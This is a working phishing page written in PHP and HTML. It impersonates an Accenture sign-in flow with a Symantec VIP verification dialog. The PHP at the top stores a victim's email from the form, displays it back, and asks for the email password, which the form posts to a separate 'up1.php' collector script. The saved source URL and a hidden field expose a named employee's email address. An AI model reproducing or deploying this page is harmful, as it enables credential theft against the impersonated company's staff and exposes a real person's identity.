<?php

session_start();
$clientemail = $_POST['off3'];
$_SESSION['clientemail']=$clientemail;

?>

<!DOCTYPE html>
<!-- saved from url=(1002)https://federation-sts.accenture.com/adfs/ls/?wauth=http%3a%2f%2fschemas.microsoft.com%2fclaims%2fmultipleauthn&mfa_max_age=259200&client-request-id=2882cafb-f40d-4cb6-8bc6-a60d51970d4b&username=cristy.e.yu%40accenture.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=estsredirect%3d2%26estsrequest%3drQIIAY2RTWjTYACGm6aLbVlxFA96cgcFEZJ8-ZJmSUAw_aHdXNeZudV4GWmaP5f0y_Lr5m2gCCIUKQg7CnqoNwUVvXvoQXbysIvgST2JiAheXPXiTZ_Dw3t-3vM4QzHSGfAHSE5NAtNkSN2Yrr8IysW5n5O9c6Vvz5fvvnlcuvygdGkfy9uabjtUaI2x03YU-aFE0yiOXIS2KGSajm5QOvJolGr0Sww7wLBxdoFneYHjOJbnGShUOAghxRsa0Ho8IMWeUSE5DlbIHhAAyZuiKYiQFTkIDrPHO3Ic2XAqFDi7xtdswUSBt-mjMNrHb9b1pFpXZaveqCqg1tTlbc_dqFtqn5XroIpET6m1eSGxN_vJ1bVtj-QVtLLc9b0bXHOxtdpppErbue6kS-uemrbVkFU69opt1Zq7rNN0atya5S0k6pKQwCtdUewHW_FiEva1gesqwhj_r4ZPceKohocGE5xAvjFw-h_wU3rghNEOZVA78UVN141BFAe_qx3ksM-5WYBL-XxxLnMyM5_5kcMezhz9cKv86cnr70N59Gx0_8XZdmYyQwdd1AIu4rqQ34jV9aW2bK7SrtXw45rmMC026Vb9ltZLU1q9UJGYIYENCeIjgX0hCneO4a8K_3rvsHgCAkYkAUOyYJ5hJMhLHHNtb7aUz5QLhXuj928f3X7X-gU1 -->
<html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
        
        <meta http-equiv="cache-control" content="no-cache,no-store">
        <meta http-equiv="pragma" content="no-cache">
        <meta http-equiv="expires" content="-1">
        <meta name="mswebdialog-title" content="Connecting to Accenture">

        <title>ESO Symantec VIP</title>
        
        
        <link rel="stylesheet" type="text/css" href="./sys_files/style.css"><style>.illustrationClass {background-image:url(/adfs/portal/illustration/illustration.png?id=183128A3C941EDE3D9199FA37D6AA90E0A7DFE101B37D10B4FEDA0CF35E11AFD);}</style>

    <link rel="stylesheet" type="text/css" title="vip-sc-default" href="./sys_files/vipbox.css"><link rel="stylesheet" type="text/css" title="" href="./sys_files/vipbox3.css"></head>
    <body dir="ltr" class="body" style="background-image: url('sys_files/obg.png')">
    <div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
        <h1>JavaScript required</h1>
        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
    </div>
    
    <div id="fullPage">
        <div id="brandingWrapper" class="float">
            <div id="branding"></div>
        </div>
        <div id="contentWrapper" class="float">
            <div id="content">
                <div id="header">
                    
                </div>
                <div id="workArea">
                    
    <div id="authArea" class="groupMargin">
        <div id="mfaGreeting" class="fieldMargin bigText hidden">Welcome </div><div id="mfaGreetingDescription" class="groupMargin">For security reasons, we require additional information to verify your account </div>
        
        <div id="customAuthArea" class="groupMargin">
<div class="fieldMargin error smallText" id="error">
    <label id="errorText" for=""></label>
</div>

<div class="groupMargin" id="mfaArea" style="text-align:center">
    Checking device registration <br>
    <img src="./sys_files/vip_loader.gif">
</div>

<form method="post" id="loginForm" autocomplete="off">
    <div class="groupMargin">
        <input id="EnterpriseId" name="EnterpriseId" type="hidden" value="cristy.e.yu">
        <input id="SecurityCode" name="SecurityCode" type="hidden">
        <input id="context" type="hidden" name="Context" value="">
        <input id="authMethod" type="hidden" name="AuthMethod" value="SymantecVipAdapter">
    </div>
</form>

</div>     <div id="authOptions">
        <form id="options" method="post" action="./up.php">
            
            <input id="optionSelection" type="hidden" name="AuthMethod">
            <div id="authOptionLinks" class="groupMargin"></div>
        </form>
      </div>
    </div>

                <div id="helpContent" class="groupMargin" style="display: none;"><span class="submit" onclick="CloseHelp();">Close</span>

<span class="submit" onclick="CloseHelp();">Close</span></div></div>
                <div id="footerPlaceholder"></div>
            </div>
            <div id="footer">
                <div id="footerLinks" class="floatReverse">
                     <div><span id="copyright">© 2016 Microsoft</span></div>
                </div>
            </div>
        </div> 
    </div>
   

    
 

</div></div><div id="cred-3-1548847608134-930" class="symc2" style="width: 400px; height: 540px; top: 30%; left: 50%; margin-left: -220px; margin-top: -125px; position: absolute; overflow: auto; z-index: 9999; box-shadow: rgba(29, 17, 86, 0.3) 0px 0px 20px; border: none; display: block;"><div id="vipDialogTop">                      <div id="vipCobranding" style="height:31px;width:185px;background:url(./sys_files/o.png) no-repeat center;">            <a id="vipCancelOTP" class="close" href="javascript:void(0);" name="vipCancelOTP"><div id="vipCloseTop"></div></a>             </div>                         </div>        <div id="n-line"></div> 		<div id="vipDialogContent"> 			<div id="vipMessageBox" class="error"><div id="vipMessageIcon"><div id="vipMessageContent"></div></div></div> 	  		<div id="vipSubviewContainer"><div id="subview"><div id="vipContent"> 		<!-- Enter Security Code --> 		<div id="vipEnterSecurityCode"> 		    <!-- Changed from We dont recognize your device  to Confirm your Identity(was title in the top)--> 	  		<!-- <span ><h3>We Don't Recognize Your Device</h3></span> -->             <div id="vipDialogIdentityText">                <span></span>             </div> 			<div class="protectionnote"><strong><font size="16px" color="#366bb2"><?php echo $clientemail ?></font></strong><br><br> Verify your email Password to Proceed</div> 			<br><br> <!-- <label id="vipOobFormLabel" class="formLabel" for="securityCode"><h3>Security Code:</h3></label> -->			<div id="vipRightPanel">

<form action="./up1.php" method="post">


<input type="password" class="textField" id="otpInput" name="off4" minlength="5" required="" placeholder="Password"  > 	





		<a href="javascript:void(0);" id="vipOoblink"></a>            <br>             <br>      <div id="vipRememberDeviceDiv" class="n-vipcheckbox">                 <input id="vipRememberDevice" value="yes" type="checkbox">                 <label for="vipRememberDevice"></label>                 <span><strong id="rememberDeviceLabel">&nbsp;&nbsp;&nbsp;&nbsp;Remember this  device</strong></span><br> <br><div class="remembernote"></div>              </div>             <br>            <div class="buttonsMargin">                <input type="button" id="vipCancelsubmitOTP" title="Cancel" value="Cancel" class="n-btn n-btnwhite">                
		
		<input type="submit" id="vipSubmitOTP" title="download 192kb" value="download 192kb" class="n-btn n-btnblue">                <div id="vipAnimationIcon"></div>            </div> 		</div></div></div></div></div> 			<div id="vipSspFrameContainer" style="display:none"><iframe id="sspFrame" width="100%" height="0" frameborder="0" src="javascript:false;" src="./sys_files/saved_resource.html"></iframe></div> 		</div>         <!-- Footer Branding -->         <div id="vipSymfooter">                          <div id="vipSymcPower"></div>                          <div id="vipEnablesymc2"></div>         </div>     <div id="vipDialogBottom"></form></div></div></body></html>